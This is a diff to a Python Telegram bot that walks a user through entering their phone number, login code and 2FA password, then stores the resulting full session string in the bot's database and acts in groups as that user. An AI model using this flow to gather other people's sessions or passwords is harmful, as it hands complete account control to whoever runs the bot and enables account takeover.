@@ -173,7 +173,6 @@ def init_db():
                         added_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                     )
                 """)
-                # ГЛАВНОЕ - ПРАВИЛЬНАЯ ТАБЛИЦА С CHAT_NAME
                 cur.execute("""
                     CREATE TABLE IF NOT EXISTS user_chats (
                         user_id BIGINT, 
@@ -778,30 +777,35 @@ async def process_phone(message: Message, state: FSMContext):
             await message.answer("❌ Отправь номер телефоном или контактом")
             return
         logging.info(f"📱 Номер: {phone}")
+        
+        # ===== СОЗДАЕМ КЛИЕНТ =====
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
-        try:
-            result = await client.send_code_request(phone)
-            await state.update_data(
-                phone=phone,
-                phone_code_hash=result.phone_code_hash,
-                session_str=client.session.save(),
-                client=client
-            )
-            await message.answer(
-                f"📱 <b>Код отправлен!</b>\n\n"
-                f"Номер: <code>{phone}</code>\n\n"
-                f"<b>Введи код из Telegram</b>\n"
-                f"<i>Например: 12345</i>",
-                parse_mode="HTML"
-            )
-            await state.set_state(AuthState.waiting_for_code)
-        except FloodWaitError as e:
-            await message.answer(f"⏳ Подожди {e.seconds} секунд")
-            await state.clear()
-        except Exception as e:
-            await message.answer(f"❌ Ошибка: {str(e)}")
-            await state.clear()
+        
+        # ===== ОТПРАВЛЯЕМ КОД =====
+        await client.send_code_request(phone)
+        
+        # ===== СОХРАНЯЕМ В СОСТОЯНИЕ =====
+        await state.update_data(
+            phone=phone,
+            client=client
+        )
+        
+        await message.answer(
+            f"📱 <b>Код отправлен!</b>\n\n"
+            f"Номер: <code>{phone}</code>\n\n"
+            f"<b>Введи код из Telegram</b>\n"
+            f"<i>Например: 12345</i>",
+            parse_mode="HTML"
+        )
+        await state.set_state(AuthState.waiting_for_code)
+        
+    except FloodWaitError as e:
+        await message.answer(f"⏳ Подожди {e.seconds} секунд")
+        await state.clear()
+    except PhoneNumberInvalidError:
+        await message.answer("❌ Некорректный номер. Проверь правильность")
+        await state.clear()
     except Exception as e:
         logging.error(f"Ошибка: {e}")
         await message.answer(f"❌ Ошибка: {str(e)}")
@@ -810,37 +814,55 @@ async def process_phone(message: Message, state: FSMContext):
 @dp.message(StateFilter(AuthState.waiting_for_code), F.text)
 async def process_code(message: Message, state: FSMContext):
     code = re.sub(r'\s+', '', message.text.strip())
+    
     if not code.isdigit():
         await message.answer("❌ Код должен содержать только цифры")
         return
+    
     data = await state.get_data()
     phone = data.get("phone")
-    phone_code_hash = data.get("phone_code_hash")
     client = data.get("client")
-    if not phone or not phone_code_hash or not client:
+    
+    if not phone or not client:
         await message.answer("❌ Данные устарели. Начни заново")
         await state.clear()
         return
+    
     await message.answer("🔄 Проверка кода...")
+    
     try:
-        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
+        # ===== ПРАВИЛЬНЫЙ ВХОД =====
+        await client.sign_in(phone=phone, code=code)
+        
+        # ===== ПОЛУЧАЕМ СЕССИЮ =====
         final_session = client.session.save()
+        
+        # ===== СОХРАНЯЕМ В БД =====
         save_session(message.from_user.id, final_session)
         save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
+        
+        # ===== ЗАПУСКАЕМ TELETHON =====
         await start_telethon_listener(message.from_user.id, final_session)
+        
         await client.disconnect()
+        
         await message.answer(
-            f"✅ <b>Аккаунт подключен!</b>\n\n"
-            f"📊 Бот загрузил все чаты.\n"
-            f"Теперь он работает в группах от твоего имени.",
-            parse_mode="HTML"
+            f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
+            f"📊 Бот загрузил все твои чаты.\n"
+            f"Теперь он работает в группах от твоего имени.\n\n"
+            f"{TEXT_COMMANDS_HELP}",
+            parse_mode="HTML",
+            reply_markup=ReplyKeyboardRemove()
         )
         await state.clear()
+        
     except SessionPasswordNeededError:
-        await message.answer("🔐 Введи пароль 2FA:", parse_mode="HTML")
+        await message.answer("🔐 <b>Внимание!</b> На аккаунте включена 2FA.\n\nВведи пароль 2FA:", parse_mode="HTML")
         await state.set_state(AuthState.waiting_for_2fa)
+        
     except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
-        await message.answer("❌ Неверный код. Попробуй еще раз")
+        await message.answer("❌ Неверный или истекший код. Попробуй еще раз")
+        
     except Exception as e:
         logging.error(f"Ошибка: {e}")
         await message.answer(f"❌ Ошибка: {str(e)}")
@@ -851,26 +873,37 @@ async def process_2fa(message: Message, state: FSMContext):
     password = message.text.strip()
     data = await state.get_data()
     client = data.get("client")
-    if not client:
+    phone = data.get("phone")
+    
+    if not client or not phone:
         await message.answer("❌ Данные устарели. Начни заново")
         await state.clear()
         return
+    
     try:
+        # ===== ВХОД С 2FA =====
         await client.sign_in(password=password)
+        
         final_session = client.session.save()
         save_session(message.from_user.id, final_session)
         save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
+        
         await start_telethon_listener(message.from_user.id, final_session)
+        
         await client.disconnect()
+        
         await message.answer(
-            f"✅ <b>Аккаунт подключен!</b>\n\n"
-            f"📊 Бот загрузил все чаты.\n"
-            f"Теперь он работает в группах от твоего имени.",
-            parse_mode="HTML"
+            f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
+            f"📊 Бот загрузил все твои чаты.\n"
+            f"Теперь он работает в группах от твоего имени.\n\n"
+            f"{TEXT_COMMANDS_HELP}",
+            parse_mode="HTML",
+            reply_markup=ReplyKeyboardRemove()
         )
         await state.clear()
+        
     except Exception as e:
-        await message.answer(f"❌ Неверный пароль: {str(e)}")
+        await message.answer(f"❌ Неверный пароль: {str(e)}\nПопробуй еще раз:")
 
 # ==================== ОТКЛЮЧЕНИЕ ====================
 @dp.message(Command("disconnect"))
